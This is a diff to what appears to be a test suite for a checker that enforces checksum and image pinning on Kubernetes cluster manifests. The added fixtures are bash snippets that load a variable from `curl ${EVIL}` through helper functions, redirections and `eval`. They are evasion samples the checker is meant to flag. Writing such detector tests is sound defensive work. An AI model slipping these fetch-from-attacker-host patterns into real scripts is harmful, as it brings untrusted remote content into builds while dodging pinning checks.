@@ -987,8 +987,12 @@ describe('kind-cluster cert-manager/Knative/Calico manifests are checksum + imag
     'helper `read` in a `case` arm': `rd() {\n  case x in\n    x) read -r "$1" ;;\n  esac\n}\nrd STATIC_LSN < <(curl -fsSL ${EVIL})`,
     'helper `IFS=, read -r -a "$1"`': `ra() { IFS=, read -r -a "$1"; }\nra STATIC_LSN < <(curl -fsSL ${EVIL})`,
     'helper `builtin printf -v "$1"`': `setv() { builtin printf -v "$1" %s "$2"; }\nsetv STATIC_LSN "$(curl -fsSL ${EVIL})"`,
+    'helper `2>/dev/null read -r "$1"`': `rd() { 2>/dev/null read -r "$1"; }\nrd STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'helper `< /dev/stdin read -r "$1"`': `rd() { < /dev/stdin read -r "$1"; }\nrd STATIC_LSN < <(curl -fsSL ${EVIL})`,
+    'helper `>&2 read -r "$1"`': `rd() { >&2 read -r "$1"; }\nrd STATIC_LSN < <(curl -fsSL ${EVIL})`,
     'helper `: "${!1:=$2}"`': `setv() { : "\${!1:=$2}"; }\nsetv STATIC_LSN "$(curl -fsSL ${EVIL})"`,
     'helper `eval "$1=…"`': `setv() { eval "$1=\\$2"; }\nsetv STATIC_LSN "$(curl -fsSL ${EVIL})"`,
+    'helper `eval "read -r $1"`': `rd() { eval "read -r $1"; }\nrd STATIC_LSN < <(curl -fsSL ${EVIL})`,
     'nameref declared, target bound later': `declare -n r; r=STATIC_LSN; r="$(curl -fsSL ${EVIL})"`,
     // wrappers and non-literal command words
     '`command -p read`': `command -p read -r STATIC_LSN < <(curl -fsSL ${EVIL})`,
